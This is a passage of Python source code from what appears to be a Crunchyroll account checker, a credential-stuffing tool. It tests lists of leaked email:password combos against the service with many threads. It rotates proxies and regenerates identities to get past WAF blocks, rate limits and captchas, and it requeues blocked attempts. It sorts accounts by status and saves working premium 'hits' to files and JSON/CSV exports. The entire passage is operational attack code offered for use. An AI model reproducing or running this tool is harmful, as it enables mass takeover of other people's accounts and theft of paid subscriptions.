    results_lock = threading.Lock()
    counter_lock = threading.Lock()
    
    stats = StatsTracker(total)
    throttler = AdaptiveThrottler(base_delay=0.3)
    
    if num_threads > 1:
        print(f"{Colors.MAGENTA}⚡ Starting TURBO check with {num_threads} threads...{Colors.RESET}")
        if proxy_manager.use_proxies:
            print(f"{Colors.GRAY}   (staggered startup to prevent proxy overload){Colors.RESET}")
        print()
        
        queue_lock = threading.Lock()
        requeue_list = []
        stop_flag = threading.Event()
        last_stats_time = [time.time()]
        
        def turbo_check_account(account_data):
            nonlocal checked_count, total_retries
            if stop_flag.is_set():
                return None
                
            email = account_data["email"]
            password = account_data["password"]
            retries = account_data["retries"]
            
            turbo_checker = CrunchyrollChecker(proxy_manager, True, ultra_mode, fast_mode or True)
            
            result = check_account(turbo_checker, email, password, retries)
            status = result.get("status")
            
            stats.record_check(status)
            
            if status == "blocked":
                throttler.record_block()
            else:
                throttler.record_success()
            
            with counter_lock:
                checked_count += 1
                current_count = checked_count
                if retries > 0:
                    total_retries += 1
            
            email_short = email[:20] + ".." if len(email) > 22 else email
            
            with print_lock:
                if status == "premium":
                    data = result.get("data", {})
                    plan = result.get("plan", "Unknown")
                    print(f"{Colors.GREEN}[{current_count}/{total}] ✅ {plan} - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["premium"].append(data)
                    save_hit(data)
                elif status == "free":
                    print(f"{Colors.YELLOW}[{current_count}/{total}] ⚪ FREE - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["free"].append(f"{email}:{password}")
                elif status == "invalid":
                    print(f"{Colors.RED}[{current_count}/{total}] ❌ BAD - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["invalid"].append(f"{email}:{password}")
                elif status == "password_reset":
                    print(f"{Colors.YELLOW}[{current_count}/{total}] 🔐 PWRST - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["password_reset"].append(f"{email}:{password}")
                    save_special_status(email, password, "password_reset")
                elif status == "locked":
                    print(f"{Colors.RED}[{current_count}/{total}] 🔒 LOCK - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["locked"].append(f"{email}:{password}")
                    save_special_status(email, password, "locked")
                elif status == "email_verify":
                    print(f"{Colors.YELLOW}[{current_count}/{total}] 📧 VERIFY - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["email_verify"].append(f"{email}:{password}")
                    save_special_status(email, password, "email_verify")
                elif status == "2fa":
                    print(f"{Colors.YELLOW}[{current_count}/{total}] 🔑 2FA - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["2fa"].append(f"{email}:{password}")
                    save_special_status(email, password, "2fa")
                elif status == "blocked":
                    error = result.get("error", "unknown")
                    retry_count = result.get("retry_count", 0)
                    if max_retries == 0 or retry_count < max_retries:
                        with queue_lock:
                            requeue_list.append({
                                "email": email,
                                "password": password,
                                "retries": retry_count + 1
                            })
                        print(f"{Colors.YELLOW}[{current_count}/{total}] ♻️ {error[:6]}→Q R{retry_count+1} - {email_short}{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[{current_count}/{total}] ⚠️ {error[:8]} MAX - {email_short}{Colors.RESET}")
                        with results_lock:
                            results["errors"].append(f"{email}:{password} | {error} (max retries)")
                else:
                    error_msg = result.get("error", "unknown")[:10]
                    print(f"{Colors.RED}[{current_count}/{total}] ⚠️ {error_msg} - {email_short}{Colors.RESET}")
                    with results_lock:
                        results["errors"].append(f"{email}:{password} | {error_msg}")
            
            return result
        
        try:
            round_num = 1
            while account_queue or requeue_list:
                if round_num > 1:
                    print(f"\n{Colors.CYAN}♻️ REQUEUE ROUND {round_num} - {len(requeue_list)} accounts to retry...{Colors.RESET}")
                    with queue_lock:
                        for acc in requeue_list:
                            account_queue.append(acc)
                        requeue_list.clear()
                
                accounts_list = list(account_queue)
                account_queue.clear()
                
                if not accounts_list:
                    break
                
                with ThreadPoolExecutor(max_workers=num_threads) as executor:
                    futures = {}
                    stagger_delay = 0.05 if round_num == 1 else 0.02
                    for i, acc in enumerate(accounts_list):
                        futures[executor.submit(turbo_check_account, acc)] = acc
                        if round_num == 1 and i < num_threads and i > 0:
                            time.sleep(stagger_delay)
                    completed_in_batch = 0
                    for future in as_completed(futures):
                        try:
                            future.result()
                            completed_in_batch += 1
                            if completed_in_batch % 10 == 0:
                                with print_lock:
                                    print(f"{Colors.GRAY}{stats.get_stats_line()}{Colors.RESET}")
                        except Exception as e:
                            acc = futures[future]
                            with print_lock:
                                print(f"{Colors.RED}[!] Error checking {acc['email'][:15]}: {str(e)[:20]}{Colors.RESET}")
                
                round_num += 1
                if round_num > 100:
                    logging.error("Too many retry rounds, stopping...")
                    break
                    
        except KeyboardInterrupt:
            stop_flag.set()
            print(f"\n\n{Colors.RED}🛑 INTERRUPTED BY USER{Colors.RESET}")
            remaining = []
            with queue_lock:
                for acc in requeue_list:
                    results["unchecked"].append(f"{acc['email']}:{acc['password']}")
                    remaining.append(acc)
            if remaining:
                cp_file = save_checkpoint(combo_file, results, remaining)
                print(f"{Colors.CYAN}💾 Checkpoint saved: {cp_file}{Colors.RESET}")
                print(f"{Colors.YELLOW}   💡 Use --resume to continue later{Colors.RESET}")
    
    else:
        try:
            while account_queue:
                account = account_queue.popleft()
                email = account["email"]
                password = account["password"]
                retries = account["retries"]
                
                checked_count += 1
                remaining_in_queue = len(account_queue)
                
                current_proxy_display = proxy_manager.get_proxy_display(checker.current_proxy) if proxy_manager.use_proxies else "D"
                
                email_short = email[:15] + ".." if len(email) > 17 else email
                
                if retries > 0:
                    total_retries += 1
                    progress = f"{checked_count}/{total}+{total_retries}"
                    print(f"{Colors.MAGENTA}[{progress}]{Colors.RESET} {Colors.YELLOW}🔄R{retries}{Colors.RESET} {email_short}", end=" ", flush=True)
                else:
                    progress = f"{checked_count}/{total}"
                    print(f"{Colors.BLUE}[{progress}]{Colors.RESET} {email_short}", end=" ", flush=True)
                
                if proxy_manager.use_proxies:
                    working = proxy_manager.get_working_proxy_count()
                    print(f"\n  {Colors.CYAN}🔌{current_proxy_display}{Colors.RESET} {Colors.GRAY}({working}/{len(proxy_manager.proxies)}){Colors.RESET}", end=" ", flush=True)
                else:
                    print(f"{Colors.GRAY}[D]{Colors.RESET}", end=" ", flush=True)
                
                result = check_account(checker, email, password, retries)
                status = result.get("status")
                
                stats.record_check(status)
                
                if status == "blocked":
                    throttler.record_block()
                else:
                    throttler.record_success()
                
                if checked_count % 5 == 0:
                    print(f"\n{Colors.GRAY}{stats.get_stats_line()}{Colors.RESET}")
                
                if status == "blocked":
                    error = result.get("error", "unknown")
                    retry_count = result.get("retry_count", 0)
                    
                    error_symbols = {
                        "waf_blocked": "🛡️ WAF",
                        "rate_limited": "⏱️ Rate",
                        "timeout": "⏳ Timeout",
                        "proxy_error": "🔌 Proxy",
                        "connection_error": "🔗 Conn",
                        "captcha_required": "🤖 Captcha"  # New symbol for captcha
                    }
                    symbol = error_symbols.get(error, "⚠️")
                    
                    if max_retries == 0 or retry_count < max_retries:
                        checker._regenerate_identity()
                        new_proxy_display = proxy_manager.get_proxy_display(checker.current_proxy) if proxy_manager.use_proxies else "D"
                        
                        account_queue.append({
                            "email": email,
                            "password": password,
                            "retries": retry_count + 1
                        })
                        
                        print(f"{Colors.RED}{symbol}{Colors.RESET}→{Colors.YELLOW}Q#{retry_count + 1}{Colors.RESET} {Colors.CYAN}→{new_proxy_display}{Colors.RESET}")
                        
                        if not brutal_mode:
                            if retry_count >= 2:
                                cooldown = throttler.get_delay() * 2
                                print(f"{Colors.GRAY}  ⏳{cooldown:.1f}s cooldown{Colors.RESET}")
                                time.sleep(cooldown)
                            else:
                                throttler.wait()
                    else:
                        print(f"{Colors.RED}{symbol} MAX RETRIES{Colors.RESET}")
                        results["errors"].append(f"{email}:{password} | {error} (retries: {retry_count})")
                        
                elif status == "premium":
                    data = result.get("data", {})
                    plan = result.get("plan", "Unknown")
                    print(f"{Colors.GREEN}✅ {plan}{Colors.RESET}")
                    results["premium"].append(data)
                    save_hit(data)
                    
                elif status == "free":
                    print(f"{Colors.YELLOW}⚪ FREE{Colors.RESET}")
                    results["free"].append(f"{email}:{password}")
                    
                elif status == "invalid":
                    print(f"{Colors.RED}❌ BAD{Colors.RESET}")
                    results["invalid"].append(f"{email}:{password}")
                    
                elif status == "password_reset":
                    print(f"{Colors.YELLOW}🔐 PWRST{Colors.RESET}")
                    results["password_reset"].append(f"{email}:{password}")
                    save_special_status(email, password, "password_reset")
                    
                elif status == "locked":
                    print(f"{Colors.RED}🔒 LOCK{Colors.RESET}")
                    results["locked"].append(f"{email}:{password}")
                    save_special_status(email, password, "locked")
                    
                elif status == "email_verify":
                    print(f"{Colors.YELLOW}📧 VERIFY{Colors.RESET}")
                    results["email_verify"].append(f"{email}:{password}")
                    save_special_status(email, password, "email_verify")
                    
                elif status == "2fa":
                    print(f"{Colors.YELLOW}🔑 2FA{Colors.RESET}")
                    results["2fa"].append(f"{email}:{password}")
                    save_special_status(email, password, "2fa")
                    
                else:
                    error_msg = result.get("error", "unknown")[:10]
                    print(f"{Colors.RED}⚠️ {error_msg}{Colors.RESET}")
                    results["errors"].append(f"{email}:{password} | {error_msg}")
                
                checker._random_pause()
                
                if account_queue and not brutal_mode:
                    throttler.wait()
                    
        except KeyboardInterrupt:
            print(f"\n\n{Colors.RED}🛑 INTERRUPTED BY USER{Colors.RESET}")
            remaining = []
            while account_queue:
                acc = account_queue.popleft()
                results["unchecked"].append(f"{acc['email']}:{acc['password']}")
                remaining.append(acc)
            if remaining:
                cp_file = save_checkpoint(combo_file, results, remaining)
                print(f"{Colors.CYAN}💾 Checkpoint saved: {cp_file}{Colors.RESET}")
                print(f"{Colors.YELLOW}   💡 Use --resume to continue later{Colors.RESET}")
    
    elapsed = stats.get_elapsed()
    final_cpm = stats.get_cpm()
    
    print("\n" + "="*50)
    print(f"{Colors.CYAN}📊 RESULTS{Colors.RESET}")
    print("="*50)
    print(f"{Colors.BLUE} 📝 Checked: {checked_count} | 🔄 Retries: {total_retries}{Colors.RESET}")
    print(f"{Colors.CYAN} 📊 Final CPM: {final_cpm:.0f} | Time: {elapsed}{Colors.RESET}")
    print(f"{Colors.GREEN} ✅ Premium: {len(results['premium'])}{Colors.RESET}")
    print(f"{Colors.YELLOW} ⚪ Free: {len(results['free'])}{Colors.RESET}")
    print(f"{Colors.RED} ❌ Bad: {len(results['invalid'])}{Colors.RESET}")
    if results['password_reset']:
        print(f"{Colors.YELLOW} 🔐 PwReset: {len(results['password_reset'])}{Colors.RESET}")
    if results['locked']:
        print(f"{Colors.RED} 🔒 Locked: {len(results['locked'])}{Colors.RESET}")
    if results['email_verify']:
        print(f"{Colors.YELLOW} 📧 Verify: {len(results['email_verify'])}{Colors.RESET}")
    if results['2fa']:
        print(f"{Colors.YELLOW} 🔑 2FA: {len(results['2fa'])}{Colors.RESET}")
    print(f"{Colors.RED} ⚠️ Errors: {len(results['errors'])}{Colors.RESET}")
    if results['unchecked']:
        print(f"{Colors.MAGENTA} ⏸️ Unchecked: {len(results['unchecked'])}{Colors.RESET}")
    if proxy_manager.use_proxies:
        print(f"{Colors.GRAY} 🔌 Proxies: {proxy_manager.get_working_proxy_count()}/{len(proxy_manager.proxies)}{Colors.RESET}")
    print("="*50)
    
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    base_name = os.path.splitext(combo_file)[0]
    results_file = f"{base_name}_results_{timestamp}.txt"
    
    with open(results_file, 'w', encoding='utf-8') as f:
        f.write("="*100 + "\n")
        f.write("CRUNCHYROLL CHECK RESULTS\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"File: {combo_file}\n")
        f.write(f"Total Checked: {checked_count} | Retries: {total_retries}\n")
        f.write("="*100 + "\n\n")
        
        f.write(f"[PREMIUM ACCOUNTS - {len(results['premium'])}]\n")
        f.write("-"*100 + "\n")
        for acc in results["premium"]:
            f.write(format_account_line(acc) + "\n")
        f.write("\n")
        
        f.write(f"[FREE ACCOUNTS - {len(results['free'])}]\n")
        f.write("-"*100 + "\n")
        for acc in results["free"]:
            f.write(f"{acc}\n")
        f.write("\n")
        
        f.write(f"[INVALID - {len(results['invalid'])}]\n")
        f.write("-"*100 + "\n")
        for acc in results["invalid"]:
            f.write(f"{acc}\n")
        f.write("\n")
        
        if results["password_reset"]:
            f.write(f"[PASSWORD RESET REQUIRED - {len(results['password_reset'])}]\n")
            f.write("-"*100 + "\n")
            for acc in results["password_reset"]:
                f.write(f"{acc}\n")
            f.write("\n")
        
        if results["locked"]:
            f.write(f"[LOCKED/SUSPENDED - {len(results['locked'])}]\n")
            f.write("-"*100 + "\n")
            for acc in results["locked"]:
                f.write(f"{acc}\n")
            f.write("\n")
        
        if results["email_verify"]:
            f.write(f"[EMAIL VERIFICATION REQUIRED - {len(results['email_verify'])}]\n")
            f.write("-"*100 + "\n")
            for acc in results["email_verify"]:
                f.write(f"{acc}\n")
            f.write("\n")
        
        if results["2fa"]:
            f.write(f"[2FA ENABLED - {len(results['2fa'])}]\n")
            f.write("-"*100 + "\n")
            for acc in results["2fa"]:
                f.write(f"{acc}\n")
            f.write("\n")
        
        f.write(f"[ERRORS - {len(results['errors'])}]\n")
        f.write("-"*100 + "\n")
        for acc in results["errors"]:
            f.write(f"{acc}\n")
    
    print(f"\n{Colors.GREEN}💾 Results saved to: {results_file}{Colors.RESET}")
    
    if results["premium"]:
        print(f"{Colors.GREEN}💎 Premium accounts saved to: Hits/Crunchyroll/{Colors.RESET}")
        
        json_file = f"{base_name}_results_{timestamp}.json"
        export_results_json(results, json_file)
        print(f"{Colors.CYAN}📄 JSON export: {json_file}{Colors.RESET}")
        
        csv_file = f"{base_name}_premium_{timestamp}.csv"
        export_results_csv(results, csv_file)
        print(f"{Colors.CYAN}📊 CSV export: {csv_file}{Colors.RESET}")
    
    if results["unchecked"]:
        unchecked_file = f"{base_name}_unchecked.txt"
        with open(unchecked_file, 'w', encoding='utf-8') as f:
            for acc in results["unchecked"]:
                f.write(f"{acc}\n")
        print(f"{Colors.MAGENTA}⏸️ Unchecked accounts saved to: {unchecked_file}{Colors.RESET}")
        print(f"{Colors.YELLOW}   💡 TIP: Run again with {unchecked_file} to continue{Colors.RESET}")


if __name__ == "__main__":
    main()